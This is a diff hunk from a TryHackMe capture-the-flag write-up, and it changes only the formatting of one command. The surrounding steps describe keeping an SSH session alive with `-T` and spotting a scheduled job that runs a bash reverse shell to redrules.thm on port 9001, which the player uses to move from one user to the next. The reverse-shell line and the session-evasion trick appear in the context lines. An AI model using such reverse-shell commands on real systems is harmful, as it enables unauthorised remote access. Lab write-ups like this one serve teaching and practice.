@@ -49,7 +49,7 @@ A pretty fun room! Few twists and turns, nothing too complicated, and similar to
 
 6. Logging on as blue, **the first flag** is in their home directory. Several messages are eventually sent your way and eventually the session is killed, as the room description suggested would happen. To avoid this, use ssh `blue@[targetIP] -T` - `-T` doesn't create a pts file, meaning standard methods of killing user sessions don't work. This is a common trick in THMs [King of the Hill](https://tryhackme.com/games/koth) game mode, which I document here on [my koth tips and tricks](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/README.md#general-tips-and-tricks).
 
-7. Poking about, you can see an interesting process being run every minute via `ps aux`: `bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001` - this is being run as the user `red`, the next target user, and if there is a listener on 9001 on redrules.thm this will grant a rev shell. If you cat /etc/hosts to see where redrules.thm is, you will see:
+7. Poking about, you can see an interesting process being run every minute via `ps aux`: `bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001` - this is being run as the user `red`, the next target user, and if there is a listener on 9001 on redrules.thm this will grant a rev shell. If you `cat /etc/hosts` to see where redrules.thm is, you will see:
 
 	```
 	127.0.0.1 localhost
